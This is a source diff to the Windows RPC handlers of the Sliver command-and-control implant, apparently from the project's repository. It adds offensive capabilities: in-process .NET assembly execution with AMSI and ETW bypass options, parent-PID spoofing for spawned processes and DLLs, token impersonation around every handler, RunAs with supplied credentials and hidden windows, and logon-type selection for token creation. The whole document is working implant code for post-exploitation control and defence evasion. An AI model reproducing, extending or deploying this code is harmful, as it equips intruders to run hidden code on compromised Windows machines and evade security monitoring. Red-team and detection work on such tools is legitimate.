@@ -24,6 +24,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"runtime"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -36,6 +37,8 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
+	"github.com/bishopfox/sliver/implant/sliver/spoof"
+	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -48,23 +51,25 @@ var (
 	windowsHandlers = map[uint32]RPCHandler{
 
 		// Windows Only
-		sliverpb.MsgTaskReq:                  taskHandler,
-		sliverpb.MsgProcessDumpReq:           dumpHandler,
-		sliverpb.MsgImpersonateReq:           impersonateHandler,
-		sliverpb.MsgRevToSelfReq:             revToSelfHandler,
-		sliverpb.MsgRunAsReq:                 runAsHandler,
-		sliverpb.MsgInvokeGetSystemReq:       getsystemHandler,
-		sliverpb.MsgInvokeExecuteAssemblyReq: executeAssemblyHandler,
-		sliverpb.MsgInvokeMigrateReq:         migrateHandler,
-		sliverpb.MsgSpawnDllReq:              spawnDllHandler,
-		sliverpb.MsgStartServiceReq:          startService,
-		sliverpb.MsgStopServiceReq:           stopService,
-		sliverpb.MsgRemoveServiceReq:         removeService,
-		sliverpb.MsgEnvReq:                   getEnvHandler,
-		sliverpb.MsgSetEnvReq:                setEnvHandler,
-		sliverpb.MsgUnsetEnvReq:              unsetEnvHandler,
-		sliverpb.MsgExecuteTokenReq:          executeTokenHandler,
-		sliverpb.MsgGetPrivsReq:              getPrivsHandler,
+		sliverpb.MsgTaskReq:                        taskHandler,
+		sliverpb.MsgProcessDumpReq:                 dumpHandler,
+		sliverpb.MsgImpersonateReq:                 impersonateHandler,
+		sliverpb.MsgRevToSelfReq:                   revToSelfHandler,
+		sliverpb.MsgRunAsReq:                       runAsHandler,
+		sliverpb.MsgInvokeGetSystemReq:             getsystemHandler,
+		sliverpb.MsgInvokeExecuteAssemblyReq:       executeAssemblyHandler,
+		sliverpb.MsgInvokeInProcExecuteAssemblyReq: inProcExecuteAssemblyHandler,
+		sliverpb.MsgInvokeMigrateReq:               migrateHandler,
+		sliverpb.MsgSpawnDllReq:                    spawnDllHandler,
+		sliverpb.MsgStartServiceReq:                startService,
+		sliverpb.MsgStopServiceReq:                 stopService,
+		sliverpb.MsgRemoveServiceReq:               removeService,
+		sliverpb.MsgEnvReq:                         getEnvHandler,
+		sliverpb.MsgSetEnvReq:                      setEnvHandler,
+		sliverpb.MsgUnsetEnvReq:                    unsetEnvHandler,
+		sliverpb.MsgExecuteWindowsReq:              executeWindowsHandler,
+		sliverpb.MsgGetPrivsReq:                    getPrivsHandler,
+		sliverpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
 
 		// Platform specific
 		sliverpb.MsgIfconfigReq:            ifconfigHandler,
@@ -89,6 +94,7 @@ var (
 		sliverpb.MsgCdReq:          cdHandler,
 		sliverpb.MsgPwdReq:         pwdHandler,
 		sliverpb.MsgRmReq:          rmHandler,
+		sliverpb.MsgMvReq:          mvHandler,
 		sliverpb.MsgMkdirReq:       mkdirHandler,
 		sliverpb.MsgExecuteReq:     executeHandler,
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
@@ -114,6 +120,28 @@ var (
 // GetSystemHandlers - Returns a map of the windows system handlers
 func GetSystemHandlers() map[uint32]RPCHandler {
 	return windowsHandlers
+}
+
+func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
+	if priv.CurrentToken != 0 {
+		err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error: %v\n", err)
+			// {{end}}
+		}
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+	}
+	handler(data, resp)
+	if priv.CurrentToken != 0 {
+		err := priv.TRevertToSelf()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error: %v\n", err)
+			// {{end}}
+		}
+	}
 }
 
 // ---------------- Windows Handlers ----------------
@@ -148,10 +176,12 @@ func runAsHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.ProcessName, runAsReq.Args)
-	runAs := &sliverpb.RunAs{
-		Output: out,
+	show := 10
+	if runAsReq.HideWindow {
+		show = 0
 	}
+	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show, runAsReq.NetOnly)
+	runAs := &sliverpb.RunAs{}
 	if err != nil {
 		runAs.Response = &commonpb.Response{Err: err.Error()}
 	}
@@ -173,6 +203,26 @@ func revToSelfHandler(_ []byte, resp RPCResponse) {
 	log.Println("revToSelf done!")
 	//{{end}}
 	data, err := proto.Marshal(revToSelf)
+	resp(data, err)
+}
+
+func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
+	tokOwnReq := &sliverpb.CurrentTokenOwnerReq{}
+	err := proto.Unmarshal(data, tokOwnReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	getCT := &sliverpb.CurrentTokenOwner{}
+	owner, err := priv.CurrentTokenOwner()
+	if err != nil {
+		getCT.Response = &commonpb.Response{Err: err.Error()}
+	}
+	getCT.Output = owner
+	data, err = proto.Marshal(getCT)
 	resp(data, err)
 }
 
@@ -203,7 +253,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process)
+	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process, execReq.ProcessArgs, execReq.PPid)
 	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
@@ -215,7 +265,27 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 
 }
 
-func executeTokenHandler(data []byte, resp RPCResponse) {
+func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
+	execReq := &sliverpb.InvokeInProcExecuteAssemblyReq{}
+	err := proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	output, err := taskrunner.InProcExecuteAssembly(execReq.Data, execReq.Arguments, execReq.Runtime, execReq.AmsiBypass, execReq.EtwBypass)
+	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
+	if err != nil {
+		execAsm.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
+	}
+	data, err = proto.Marshal(execAsm)
+	resp(data, err)
+}
+
+func executeWindowsHandler(data []byte, resp RPCResponse) {
 	var (
 		err       error
 		stdErr    io.Writer
@@ -223,7 +293,7 @@ func executeTokenHandler(data []byte, resp RPCResponse) {
 		errWriter *bufio.Writer
 		outWriter *bufio.Writer
 	)
-	execReq := &sliverpb.ExecuteReq{}
+	execReq := &sliverpb.ExecuteWindowsReq{}
 	err = proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -236,8 +306,17 @@ func executeTokenHandler(data []byte, resp RPCResponse) {
 	cmd := exec.Command(execReq.Path, execReq.Args...)
 
 	// Execute with current token
-	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(priv.CurrentToken),
+	cmd.SysProcAttr = &syscall.SysProcAttr{}
+	if execReq.UseToken {
+		cmd.SysProcAttr.Token = syscall.Token(priv.CurrentToken)
+	}
+	if execReq.PPid != 0 {
+		err := spoof.SpoofParent(execReq.PPid, cmd)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("could not spoof parent PID: %v\n", err)
+			// {{end}}
+		}
 	}
 
 	if execReq.Output {
@@ -352,7 +431,7 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	//{{if .Config.Debug}}
 	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
 	//{{end}}
-	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
+	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetProcessArgs(), spawnReq.GetPPid(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
 	spawnResp := &sliverpb.SpawnDll{Result: result}
 	if err != nil {
 		spawnResp.Response = &commonpb.Response{
@@ -371,7 +450,7 @@ func makeTokenHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	makeTokenResp := &sliverpb.MakeToken{}
-	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password)
+	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password, makeTokenReq.LogonType)
 	if err != nil {
 		makeTokenResp.Response = &commonpb.Response{
 			Err: err.Error(),
